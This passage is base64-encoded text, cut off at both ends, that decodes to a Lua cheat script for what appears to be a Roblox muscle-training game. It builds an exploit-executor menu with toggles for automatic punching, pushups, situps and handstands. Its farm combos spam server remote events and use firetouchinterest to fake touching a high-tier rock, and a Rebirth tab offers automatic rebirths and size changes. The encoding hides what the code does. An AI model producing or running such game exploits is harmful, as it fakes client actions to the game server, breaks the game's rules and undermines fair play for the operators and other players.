gKbG9jYWwgZnVuY3Rpb24gYXV0b1B1bmNoKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lCiAgICBfRy5wdW5jaGFuaW0gPSB0cnVlCgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKSAgCiAgICAgICAgaWYgX0cucHVuY2hhbmltIHRoZW4gIAogICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSAgCiAgICAgICAgICAgICAgICBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgIAogICAgICAgICAgICAgICAgZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgYW5kIGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpICAKCiAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuICAKICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbC5QYXJlbnQgfj0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpCiAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICAgICAgcHVuY2hUb29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgZWxzZSAgCiAgICAgICAgICAgICAgICB3YXJuKCJQdW5jaCB0b29sIG5vdCBmb3VuZCIpICAKICAgICAgICAgICAgICAgIF9HLnB1bmNoYW5pbSA9IGZhbHNlCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kICAKICAgIGVuZCkKZW5kCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBQdW5jaCIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBwdW5jaCB0b29sIGFjdGl2YXRpb24iLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0cucHVuY2hhbmltID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGF1dG9QdW5jaCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEluZGl2aWR1YWwgRXhlcmNpc2UgVG9nZ2xlcwpsb2NhbCBmdW5jdGlvbiBhdXRvTXVzY2xlKGFjdGlvbikKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBfR1thY3Rpb25dIGRvCiAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChhY3Rpb24pIAogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgZW5kCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIsIGFjdGlvbikKICAgICAgICB0YXNrLndhaXQoKQogICAgZW5kCgogICAgaWYgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChhY3Rpb24pIHRoZW4KICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyW2FjdGlvbl0uUGFyZW50ID0gcGxheWVyLkJhY2twYWNrCiAgICBlbmQKZW5kCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBXZWlnaHQiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgd2VpZ2h0IHRyYWluaW5nIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HWyJXZWlnaHQiXSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiAKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpIGF1dG9NdXNjbGUoIldlaWdodCIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFB1c2h1cHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgcHVzaHVwcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfR1siUHVzaHVwcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiUHVzaHVwcyIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEhhbmRzdGFuZHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgaGFuZHN0YW5kcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfR1siSGFuZHN0YW5kcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiSGFuZHN0YW5kcyIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNpdHVwcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBzaXR1cHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0dbIlNpdHVwcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiU2l0dXBzIikgZW5kKSAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gT1AgRmFybSBDb21ib3MgU2VjdGlvbgpBdXRvRmFybTpTZWN0aW9uKHtUaXRsZSA9ICJPUCBGQVJNIENPTUJPUyJ9KQoKLS0gUHVzaHVwcyArIEp1bmdsZSBSb2NrIENvbWJvCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJQdXNodXBzICsgSnVuZ2xlIFJvY2siLAogICAgRGVzYyA9ICJBdXRvIFB1c2h1cHMsIEp1bmdsZSBSb2NrICYgQXV0byBQdW5jaCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQogICAgICAgIF9HLkF1dG9QdXNodXBzID0gc3RhdGUKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayIKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgaWYgX0cuQXV0b1B1c2h1cHMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1c2h1cHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdXNodXBzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdXNodXBzIikKICAgICAgICAgICAgICAgICAgICBpZiBwdXNodXBzVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wocHVzaHVwc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIGFuZCBwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIFNpdHVwcyArIEp1bmdsZSBSb2NrIENvbWJvCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJTaXR1cHMgKyBKdW5nbGUgUm9jayIsCiAgICBEZXNjID0gIkF1dG8gU2l0dXBzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUKICAgICAgICBfRy5BdXRvU2l0dXBzID0gc3RhdGUKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayIKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgaWYgX0cuQXV0b1NpdHVwcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2l0dXBzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU2l0dXBzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKQogICAgICAgICAgICAgICAgICAgIGlmIHNpdHVwc1Rvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHNpdHVwc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIGFuZCBwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIEhhbmRzdGFuZHMgKyBKdW5nbGUgUm9jayBDb21ibwpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiSGFuZHN0YW5kcyArIEp1bmdsZSBSb2NrIiwKICAgIERlc2MgPSAiQXV0byBIYW5kc3RhbmRzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUKICAgICAgICBfRy5BdXRvSGFuZHN0YW5kcyA9IHN0YXRlCiAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gc3RhdGUKICAgICAgICBzZWxlY3Ryb2NrID0gIkFuY2llbnQgSnVuZ2xlIFJvY2siCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgIGlmIF9HLkF1dG9IYW5kc3RhbmRzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBoYW5kc3RhbmRzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgaGFuZHN0YW5kc1Rvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKGhhbmRzdGFuZHNUb29sKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgYXV0b1B1bmNoTm9BbmltIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sLlBhcmVudCB+PSBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJQdW5jaCB0b29sIG5vdCBmb3VuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGdhbWUuV29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTAwMDAwMDAgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdldHRvb2wgdGhlbiBwY2FsbChnZXR0b29sKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pICAgICAgICAKICAgICAgICAKLS0gUmViaXJ0aCBUYWIKbG9jYWwgUmViaXJ0aFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlJlYmlydGgiLCBJY29uID0gInJvdGF0ZS1jdyJ9KQoKLS0gVGFyZ2V0IFJlYmlydGggU2VjdGlvbgpSZWJpcnRoVGFiOlNlY3Rpb24oe1RpdGxlID0gIlRhcmdldCBSZWJpcnRoIn0pCmxvY2FsIHRhcmdldFJlYmlydGggPSAwCmxvY2FsIGF1dG9SZWJpcnRoQWN0aXZlID0gZmFsc2UKClJlYmlydGhUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJUYXJnZXQgUmViaXJ0aCIsCiAgICBEZXNjID0gIlNldCB0YXJnZXQgcmViaXJ0aCBudW1iZXIiLAogICAgUGxhY2Vob2xkZXIgPSAiRXhhbXBsZTogMTUwMCIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2xlYXJUZXh0T25Gb2N1cyA9IHRydWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGxvY2FsIHRhcmdldCA9IHRvbnVtYmVyKGlucHV0KQogICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0ID4gMCB0aGVuCiAgICAgICAgICAgIHRhcmdldFJlYmlydGggPSB0YXJnZXQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKUmViaXJ0aFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBSZWJpcnRoIFRvIFRhcmdldCIsCiAgICBEZXNjID0gIlJlYmlydGggdW50aWwgdGFyZ2V0IHJlYWNoZWQiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBpZiB0YXJnZXRSZWJpcnRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICBhdXRvUmViaXJ0aEFjdGl2ZSA9IHRydWUKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oYXV0b1JlYmlydGhUYXJnZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgYXV0b1JlYmlydGhBY3RpdmUgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBPdGhlciBGZWF0dXJlcyBTZWN0aW9uClJlYmlydGhUYWI6U2VjdGlvbih7VGl0bGUgPSAiTm9ybWFsIFJlYmlydGgifSkKClJlYmlydGhUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gUmViaXJ0aCAoSU5GSU5JVEUpIiwKICAgIERlc2MgPSAiQ29udGludW91cyByZWJpcnRoIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9SZWJpcnRoRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9SZWJpcnRoSW5maW5pdGUpIGVuZAogICAgZW5kCn0pCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNpemUgMiIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgc2V0IHNpemUgdG8gMiIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBzaXplQ2hhbmdlRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGNoYW5nZVNpemUpIGV